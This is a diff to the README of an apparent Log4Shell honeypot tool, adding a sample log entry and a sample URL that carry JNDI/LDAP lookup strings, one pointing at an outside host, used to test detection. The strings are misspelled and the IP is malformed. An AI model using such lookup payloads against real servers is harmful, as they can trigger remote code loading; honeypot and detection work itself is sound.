@@ -27,3 +27,9 @@ Example command:
 python3 SimpleHoneypot.py
 
 [2021-12-09 13:00:00,000] Possible CVE-2021-44228 Attempt: 127.0.0.1:1111 -> port 8080 - GET /?id=${jdni:ldap://127.0.0.1:1389/hax} HTTP/1.1
+
+```
+
+## Sample URL:
+
+http://kgb.fyi:443/?id=${jdni:ldap://133.33.33.331389/HELLO-CLASS}
